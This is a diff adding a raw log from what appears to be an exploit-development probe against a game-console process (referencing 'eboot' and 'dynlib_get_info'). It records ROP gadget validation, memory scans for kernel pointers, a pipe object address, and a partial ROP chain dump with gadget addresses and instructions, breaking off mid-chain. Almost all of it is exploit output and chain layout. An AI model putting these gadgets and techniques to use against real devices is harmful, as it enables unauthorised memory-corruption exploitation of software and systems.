@@ -1,0 +1,40 @@
+=== PROBE 118d: RDI OFFSET READ ===
+
+pid=1419
+eboot=0x004C64000
+
+--- A: VALIDATE GADGETS ---
+  buf=0x310F33B80
+  buf+0x10: 0x3333333333333400 (expect 3333)
+  buf+0x18: 0x4444444444444400 (expect 4444)
+  G10(rdi=buf): 0x3333333333333400 (expect 3333=buf+0x10)
+  G18(rdi=buf): 0x4444444444444400 (expect 4444=buf+0x18)
+  memory.rq(eboot): 0x6365786562696C2F
+  G10(rdi=EB-16):   0x6365786562696C00 (should match)
+  MISMATCH — gadget may not work as expected
+
+--- B: SCAN dynlib_get_info STRUCT ---
+  +0x008: 0x69622E746F6F6265 (userland ptr?)
+  +0x110: 0x500494000 (userland ptr?)
+  +0x120: 0x300180000 (userland ptr?)
+  +0x130: 0x100018000 (userland ptr?)
+  +0x148: 0xA7266D1600000003 (userland ptr?)
+  +0x150: 0x183EB6EC9E4F76F (userland ptr?)
+  kernel ptrs in dynlib struct: 0
+
+--- C: READ BEYOND EBOOT TEXT ---
+  skipping (gadget not confirmed)
+
+--- D: SCAN PIPE OBJECT ---
+  pipe: address @ 0x82450cb57
+
+ropchain @ 0x310e4a0f0 (size: 0x2f0)
+
+fcall_stub.fn_addr: 0x310e49fd0
+fcall_stub.return_addr: 0x310e49fe0
+
+0x310e4a0f0: 0x4c64042	; ret
+0x310e4a0f8: 0x4c64992	; pop rax; ret
+0x310e4a100: 0x310e48040
+0x310e4a108: 0x4c82ebb	; mov rax, [rax]; ret
+0x310e4a110: 0x4d2ddfe	; pop rdi;
